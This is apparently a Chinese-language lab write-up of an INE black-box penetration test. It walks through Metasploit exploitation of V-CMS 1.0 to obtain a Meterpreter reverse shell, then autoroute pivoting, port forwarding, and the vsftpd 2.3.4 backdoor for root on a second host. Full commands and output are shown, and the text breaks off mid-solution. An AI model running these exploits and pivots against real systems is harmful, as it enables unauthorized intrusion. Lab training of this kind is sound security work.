---
layout: post
title: "Black-box Penetration Test 1"
date: "2022-08-03"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# 黑盒渗透测试 1
## 概述
在本实验中，您将学习利用易受攻击的应用程序并执行网络旋转。

## 任务
### 实验室环境
在这个实验室环境中，用户将获得对 Kali GUI 实例的访问权限。可以使用安装在 Kali 上demo.ine.local上的工具访问 Web 服务器。但是，设置中有另一台机器无法从 Kali 机器访问，但可以从 Web 服务器访问。

目标：攻破两台机器以取回旗帜！

### 工具
该实验室的最佳工具是：

* Metasploit Framework

* Nmap

* Curl

## 我自己的思路
```
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.8  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:08  txqueuelen 0  (Ethernet)
        RX packets 699  bytes 85684 (83.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 587  bytes 1947638 (1.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.132.120.2  netmask 255.255.255.0  broadcast 192.132.120.255
        ether 02:42:c0:84:78:02  txqueuelen 0  (Ethernet)
        RX packets 15  bytes 1306 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2389  bytes 24417521 (23.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2389  bytes 24417521 (23.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (192.132.120.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.132.120.3): icmp_seq=1 ttl=64 time=0.080 ms
64 bytes from demo.ine.local (192.132.120.3): icmp_seq=2 ttl=64 time=0.047 ms
64 bytes from demo.ine.local (192.132.120.3): icmp_seq=3 ttl=64 time=0.077 ms
64 bytes from demo.ine.local (192.132.120.3): icmp_seq=4 ttl=64 time=0.059 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3077ms
rtt min/avg/max/mdev = 0.047/0.065/0.080/0.013 ms
```

```
root@INE:~# nmap -O -A demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 10:32 IST
Nmap scan report for demo.ine.local (192.132.120.3)
Host is up (0.000043s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: V-CMS-Powered by V-CMS
|_http-server-header: nginx/1.14.0
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 02:42:C0:84:78:03 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.04 ms demo.ine.local (192.132.120.3)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.27 seconds
```

```
root@INE:~# curl http://demo.ine.local
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- Powered By V-CMS 1.0 - http://www.v-cms.org -->
<!-- Removal of this notice is in violation of the GNU licensing. -->
<!-- Copyright 2011 VyReN, LLC, All Rights Reserved -->
```

在80 TCP上运行着V-CMS 1.0应用程序。

[V-CMS PHP File Upload and Execute](https://www.rapid7.com/db/modules/exploit/linux/http/vcms_upload/)

```
msf6 > use exploit/linux/http/vcms_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(linux/http/vcms_upload) > show options

Module options (exploit/linux/http/vcms_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /vcms/           yes       The URI path to vcms
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.0.8         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (PHP Payload)


msf6 exploit(linux/http/vcms_upload) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(linux/http/vcms_upload) > set TARGETURI /
TARGETURI => /
msf6 exploit(linux/http/vcms_upload) > set LHOST 192.132.120.2
LHOST => 192.132.120.2
msf6 exploit(linux/http/vcms_upload) > exploit

[*] Started reverse TCP handler on 192.132.120.2:4444 
[*] 192.132.120.3:80 Uploading payload: OVMtm.php
[*] 192.132.120.3:80 replies status: 200
[*] 192.132.120.3:80 Executing payload: OVMtm.php
[*] Sending stage (39282 bytes) to 192.132.120.3
[*] Meterpreter session 1 opened (192.132.120.2:4444 -> 192.132.120.3:58200 ) at 2022-08-03 10:41:46 +0530

meterpreter > 

```

发现第一个flag：`4f96a3e848d233d5af337c440e50fe3d`。

```
meterpreter > search -h
Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...
Search for files.

OPTIONS:

    -a <opt>  Find files modified after timestamp (UTC).  Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
    -b <opt>  Find files modified before timestamp (UTC). Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
    -d <opt>  The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
    -f <opt>  A file pattern glob to search for. (e.g. *secret*.doc?)
    -h        Help Banner
    -r <opt>  Recursively search sub directories. (Default: true)

meterpreter > search -d / -f flag.txt
Found 1 result...
=================

Path             Size (bytes)  Modified (UTC)
----             ------------  --------------
//root/flag.txt  33            2018-10-12 23:56:33 +0530

meterpreter > cat /root/flag.txt
4f96a3e848d233d5af337c440e50fe3d
```

目标demo.ine.local的eth0是`192.132.120.3/24`，eth1是`192.169.19.2/24`。

```
meterpreter > sysinfo
Computer    : demo.ine.local
OS          : Linux demo.ine.local 5.4.0-121-generic #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022 x86_64
Meterpreter : php/linux
meterpreter > shell
Process 576 created.
Channel 0 created.
/bin/sh -i
/bin/sh: 0: can't access tty; job control turned off
# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.132.120.3  netmask 255.255.255.0  broadcast 192.132.120.255
        ether 02:42:c0:84:78:03  txqueuelen 0  (Ethernet)
        RX packets 66869  bytes 3983240 (3.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 66813  bytes 3676884 (3.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.169.19.2  netmask 255.255.255.0  broadcast 192.169.19.255
        ether 02:42:c0:a9:13:02  txqueuelen 0  (Ethernet)
        RX packets 18  bytes 1532 (1.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

在攻击者机器上，ping `192.169.19.2`，没有响应。

```
root@INE:~# ping 192.169.19.2 -c 4
PING 192.169.19.2 (192.169.19.2) 56(84) bytes of data.

--- 192.169.19.2 ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3079ms
```

推测第二个目标在`192.169.19.0/24`网络上。

[PIVOTING](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

我们希望利用这些新发现的信息并攻击这个额外的网络。Metasploit 有一个**自动路由**Meterpreter 脚本，它允许我们通过我们的第一台受感染机器攻击第二个网络。

```
meterpreter > run autoroute -h

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
meterpreter > run autoroute -s 192.169.19.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.169.19.0/255.255.255.0...
[+] Added route to 192.169.19.0/255.255.255.0 via 192.132.120.3
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.169.19.0       255.255.255.0      Session 1
```

现在我们已经添加了额外的路由，并通过按 Ctrl-z 使我们的 Meterpreter 会话成为后台。

现在我们需要确定我们发现的第二个网络上是否还有其他系统。我们将使用一个基本的 TCP 端口扫描器来查找端口。

```
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(linux/http/vcms_upload) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.169.19.3-10
RHOSTS => 192.169.19.3-10
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 25,22,110,143,80,443,137,138,139,115,23,21,3389,3306,1433
PORTS => 25,22,110,143,80,443,137,138,139,115,23,21,3389,3306,1433
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
THREADS => 10
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.169.19.3:         - 192.169.19.3:21 - TCP OPEN
[+] 192.169.19.3:         - 192.169.19.3:22 - TCP OPEN

[*] 192.169.19.3-10:      - Scanned 5 of 8 hosts (62% complete)
[*] 192.169.19.3-10:      - Scanned 5 of 8 hosts (62% complete)
[*] 192.169.19.3-10:      - Scanned 5 of 8 hosts (62% complete)
[*] 192.169.19.3-10:      - Scanned 5 of 8 hosts (62% complete)
[*] 192.169.19.3-10:      - Scanned 5 of 8 hosts (62% complete)
[*] 192.169.19.3-10:      - Scanned 5 of 8 hosts (62% complete)
[*] 192.169.19.3-10:      - Scanned 6 of 8 hosts (75% complete)
[*] 192.169.19.3-10:      - Scanned 7 of 8 hosts (87% complete)
[*] 192.169.19.3-10:      - Scanned 8 of 8 hosts (100% complete)
[*] Auxiliary module execution completed

```

扫描结果显示，192.169.19.3的TCP 21,22端口开放。

[PORTFWD](https://www.offensive-security.com/metasploit-unleashed/portfwd/)

攻击者机器，设置端口转发之前：

```
root@INE:~# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:37267        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5910            0.0.0.0:*               LISTEN      197/Xtigervnc       
tcp        0      0 0.0.0.0:45654           0.0.0.0:*               LISTEN      30/java             
tcp        0      0 127.0.0.1:4822          0.0.0.0:*               LISTEN      31/guacd            
tcp        0      0 127.0.0.1:3350          0.0.0.0:*               LISTEN      27/xrdp-sesman      
tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      25/xrdp             
tcp        0      0 127.0.0.1:8005          0.0.0.0:*               LISTEN      30/java             
tcp        0      0 127.0.0.1:44719         127.0.0.1:46196         ESTABLISHED 391/ruby            
tcp        0      0 127.0.0.1:44637         127.0.0.1:38032         ESTABLISHED 391/ruby            
tcp        0      0 127.0.0.1:4822          127.0.0.1:55792         ESTABLISHED 31/guacd            
tcp        0      0 127.0.0.1:38032         127.0.0.1:44637         ESTABLISHED 391/ruby            
tcp        0      0 127.0.0.1:60784         127.0.0.1:5910          ESTABLISHED 193/xrdp            
tcp        0      0 127.0.0.1:54348         127.0.0.1:3389          ESTABLISHED 88/guacd            
tcp        0      0 127.0.0.1:5910          127.0.0.1:60784         ESTABLISHED 197/Xtigervnc       
tcp        0      0 127.0.0.1:55792         127.0.0.1:4822          ESTABLISHED 30/java             
tcp        0      0 127.0.0.1:3389          127.0.0.1:54348         ESTABLISHED 193/xrdp            
tcp        0      0 192.132.120.2:4444      192.132.120.3:46508     ESTABLISHED 391/ruby            
tcp        0      0 127.0.0.1:46196         127.0.0.1:44719         ESTABLISHED 391/ruby            
tcp        0      0 10.1.0.8:45654          10.1.0.2:44560          ESTABLISHED 30/java             
tcp6       0      0 :::5910                 :::*                    LISTEN      197/Xtigervnc
```

首先，我们使用以下命令在我们的枢轴上设置端口转发：

```
meterpreter > portfwd add -l 21 -p 21 -r 192.169.19.3
[*] Local TCP relay created: :21 <-> 192.169.19.3:21
meterpreter > portfwd add -l 22 -p 22 -r 192.169.19.3
[*] Local TCP relay created: :22 <-> 192.169.19.3:22
```

我们通过从另一个终端发出netstat命令来验证端口21,22是否正在侦听。

在攻击者机器上查看正在监听的端口和当前的（TCP）连接，发现端口21,22正在监听。

```
root@INE:~# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:37267        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      391/ruby            
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      391/ruby            
tcp        0      0 0.0.0.0:5910            0.0.0.0:*               LISTEN      197/Xtigervnc       
tcp        0      0 0.0.0.0:45654           0.0.0.0:*               LISTEN      30/java             
tcp        0      0 127.0.0.1:4822          0.0.0.0:*               LISTEN      31/guacd            
tcp        0      0 127.0.0.1:3350          0.0.0.0:*               LISTEN      27/xrdp-sesman      
tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      25/xrdp             
tcp        0      0 127.0.0.1:8005          0.0.0.0:*               LISTEN      30/java             
tcp        0      0 127.0.0.1:44719         127.0.0.1:46196         ESTABLISHED 391/ruby            
tcp        0      0 127.0.0.1:44637         127.0.0.1:38032         ESTABLISHED 391/ruby            
tcp        0      0 127.0.0.1:4822          127.0.0.1:55792         ESTABLISHED 31/guacd            
tcp        0      0 127.0.0.1:38032         127.0.0.1:44637         ESTABLISHED 391/ruby            
tcp        0      0 127.0.0.1:60784         127.0.0.1:5910          ESTABLISHED 193/xrdp            
tcp        0      0 127.0.0.1:54348         127.0.0.1:3389          ESTABLISHED 88/guacd            
tcp        0      0 127.0.0.1:5910          127.0.0.1:60784         ESTABLISHED 197/Xtigervnc       
tcp        0      0 127.0.0.1:55792         127.0.0.1:4822          ESTABLISHED 30/java             
tcp        0      0 127.0.0.1:3389          127.0.0.1:54348         ESTABLISHED 193/xrdp            
tcp        0      0 192.132.120.2:4444      192.132.120.3:46508     ESTABLISHED 391/ruby            
tcp        0      0 127.0.0.1:46196         127.0.0.1:44719         ESTABLISHED 391/ruby            
tcp        0      0 10.1.0.8:45654          10.1.0.2:44560          ESTABLISHED 30/java             
tcp6       0      0 :::5910                 :::*                    LISTEN      197/Xtigervnc
```

使用nmap扫描本地的21,22端口。在TCP 21上运行ftp服务，版本为`vsftpd 2.0.8 or later`。在TCP 22上运行ssh服务，版本为`OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)`。

```
meterpreter > 
Background session 2? [y/N]  
msf6 exploit(linux/http/vcms_upload) > nmap -O -A -p21,22 localhost
[*] exec: nmap -O -A -p21,22 localhost

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 11:43 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000031s latency).
Other addresses for localhost (not scanned): ::1

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable anonymous root".
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 87:26:5e:08:a8:ce:be:56:6b:f3:0e:06:de:5d:12:e6 (DSA)
|   2048 e0:03:18:cf:30:6f:12:49:d7:44:40:2e:aa:ec:e9:db (RSA)
|   256 14:2d:2c:5a:cc:66:2c:72:b0:de:c0:de:ab:41:7c:5c (ECDSA)
|_  256 ee:d1:70:11:25:29:17:f0:ee:05:36:a4:92:9c:88:28 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.18 seconds
```

[VSFTPD v2.3.4 Backdoor Command Execution](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)

```
msf6 exploit(linux/http/vcms_upload) > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.169.19.3
RHOSTS => 192.169.19.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.169.19.3:21 - Banner: 220 Welcome to AttackDefense target FTP service.
[*] 192.169.19.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.169.19.3:21 - The port used by the backdoor bind listener is already open
[+] 192.169.19.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 3 opened (0.0.0.0:0 -> 192.169.19.3:6200 via session 2) at 2022-08-03 11:54:48 +0530

/bin/sh -i
/bin/sh: 0: can't access tty; job control turned off
# 

```

获得第二个flag：`58c7c29a8ab5e7c4c06256b954947f9a`。

```
# ifconfig 
eth0      Link encap:Ethernet  HWaddr 02:42:c0:a9:13:03  
          inet addr:192.169.19.3  Bcast:192.169.19.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:321 errors:0 dropped:0 overruns:0 frame:0
          TX packets:187 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:24005 (24.0 KB)  TX bytes:26099 (26.0 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

# find / -name flag.txt
/root/flag.txt
find: `/proc/tty/driver': Permission denied
# cat /root/flag.txt
58c7c29a8ab5e7c4c06256b954947f9a
```

## 解决方案
第 1 步：打开实验室链接以访问 Kali GUI 实例。

第 2 步：检查提供的机器/域是否可访问。

命令

```
ping demo.ine.local
```

```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (192.162.220.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.162.220.3): icmp_seq=1 ttl=64 time=0.085 ms
64 bytes from demo.ine.local (192.162.220.3): icmp_seq=2 ttl=64 time=0.046 ms
64 bytes from demo.ine.local (192.162.220.3): icmp_seq=3 ttl=64 time=0.049 ms
64 bytes from demo.ine.local (192.162.220.3): icmp_seq=4 ttl=64 time=0.070 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3060ms
rtt min/avg/max/mdev = 0.046/0.062/0.085/0.015 ms
```

提供的机器是可达的，我们也找到了目标IP地址。

第 3 步：检查提供的机器上的开放端口。

命令

```
nmap demo.ine.local
```

```
root@INE:~# nmap demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 16:50 IST
Nmap scan report for demo.ine.local (192.162.220.3)
Host is up (0.0000090s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:42:C0:A2:DC:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
```

在提供的机器上，端口 80 (HTTP)、3306 (MySQL) 是开放的。

我们将以端口 80 为目标来查找正在运行的应用程序名称和版本以继续进行。

第 4 步：检查 Kali 机器上存在的接口。

命令

```
ifconfig
```

```
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.9  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:09  txqueuelen 0  (Ethernet)
        RX packets 4913  bytes 405335 (395.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4344  bytes 2286222 (2.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.162.220.2  netmask 255.255.255.0  broadcast 192.162.220.255
        ether 02:42:c0:a2:dc:02  txqueuelen 0  (Ethernet)
        RX packets 1025  bytes 56014 (54.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1010  bytes 58668 (57.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                                                                                          
                                                                                                                                                                                            
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                                                                                                                                
        inet 127.0.0.1  netmask 255.0.0.0                                                                                                                                                   
        loop  txqueuelen 1000  (Local Loopback)                                                                                                                                             
        RX packets 16064  bytes 35079950 (33.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16064  bytes 35079950 (33.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

机器上有两个接口（不包括环回接口），即 eth0 和 eth1。

在这种情况下，我们感兴趣的是 eth1 接口 IP 地址范围：192.162.220.0/24

注意：您的 IP 地址会有所不同，因此请确保使用正确的 IP 地址，否则命令可能不会给出预期的结果！

第 5 步：在端口 80 上运行 nmap 以查找有关目标服务器的所有可能信息。

命令

```
nmap -A -O -p 80 demo.ine.local
```

`-A`：启用操作系统检测、版本检测、脚本扫描和traceroute
`-O`：启用操作系统检测
`-p`：端口

```
root@INE:~# nmap -A -O -p 80 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 16:54 IST
Nmap scan report for demo.ine.local (192.162.220.3)
Host is up (0.000036s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0
|_http-title: V-CMS-Powered by V-CMS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.14.0
MAC Address: 02:42:C0:A2:DC:03 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.04 ms demo.ine.local (192.162.220.3)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds
```

机器在端口 80 上运行 nginx 1.14.0 服务器，并在其上托管 V-CMS 应用程序。

第 6 步：要了解 V-CMS 应用程序的版本，请打开 Firefox 浏览器并访问 V-CMS 应用程序。

网址

```
http://demo.ine.local
```

页脚中提到了1.0版。`V-CMS v1.0`

第 7 步：搜索此版本 V-CMS 的公开可用漏洞。

```
vcms 1.0 exploit
```

我们可以观察到 V-CMS v1.0 容易受到 PHP 文件上传和执行的影响。此外，还有一个 metasploit 模块可以利用它。

[V-CMS PHP 文件上传和执行](https://www.rapid7.com/db/modules/exploit/linux/http/vcms_upload/)

[V-CMS - Arbitrary '.PHP' File Upload / Execution (Metasploit)](https://www.exploit-db.com/exploits/18738)

我们可以使用这个模块进行开发。

第 8 步：启动 Metasploit 框架并搜索 vcms 模块。然后，检查所有 vcms 模块可用的选项。

命令

```
msfconsole -q
search vcms
use exploit/linux/http/vcms_upload
show options
```

```
root@INE:~# msfconsole -q
msf6 > search vcms

Matching Modules
================

   #  Name                               Disclosure Date  Rank       Check  Description
   -  ----                               ---------------  ----       -----  -----------
   0  exploit/linux/http/gravcms_exec    2021-03-29       normal     Yes    GravCMS Remote Command Execution
   1  auxiliary/scanner/http/vcms_login                   normal     No     V-CMS Login Utility
   2  exploit/linux/http/vcms_upload     2011-11-27       excellent  Yes    V-CMS PHP File Upload and Execute


Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/http/vcms_upload

msf6 > use exploit/linux/http/vcms_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(linux/http/vcms_upload) > show options

Module options (exploit/linux/http/vcms_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /vcms/           yes       The URI path to vcms
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.0.9         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (PHP Payload)
```

我们找到了 vcms 漏洞利用模块。

我们可以注意到，“TARGETURI”设置为 `/vcms/` 路径。我们需要将该值更改为“`/`”，因为 v-cms 应用程序存在于基地址中。

将“RHOSTS”（或远程主机）设置为暴露端口 80 的 demo.ine.local

模块中默认提及端口 80，还设置了`php/meterpreter/reverse_tcp`有效负载以及“LHOST”和“LPORT”（本地机器 IP 地址和端口），用于 Meterpreter shell 的反向连接。

默认提及的 LHOST IP 地址无效。（10.1.0.3）。我们必须在此设置中将其替换为适当的地址“192.162.220.2”

第 9 步：设置目标信息并利用 vcms 应用程序

命令

```
set RHOSTS demo.ine.local
set TARGETURI /
set LHOST 192.62.135.2
check
exploit
getuid
```

注意： “`check`”命令快速验证所有模块设置和目标是否有效。

```
msf6 exploit(linux/http/vcms_upload) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(linux/http/vcms_upload) > set TARGETURI /
TARGETURI => /
msf6 exploit(linux/http/vcms_upload) > set LHOST 192.162.220.2
LHOST => 192.162.220.2
msf6 exploit(linux/http/vcms_upload) > check
[*] 192.162.220.3:80 - The target appears to be vulnerable.
msf6 exploit(linux/http/vcms_upload) > exploit

[*] Started reverse TCP handler on 192.162.220.2:4444 
[*] 192.162.220.3:80 Uploading payload: GcPAo.php
[*] 192.162.220.3:80 replies status: 200
[*] 192.162.220.3:80 Executing payload: GcPAo.php
[*] Sending stage (39282 bytes) to 192.162.220.3
[*] Meterpreter session 1 opened (192.162.220.2:4444 -> 192.162.220.3:56888 ) at 2022-08-03 17:03:24 +0530

meterpreter > getuid
Server username: root
```

我们已经使用 Metasploit 框架成功地利用了 v-cms，并收到了一个具有 root 权限的 Meterpreter 会话。

第 10 步：检索第一个标志。

命令

```
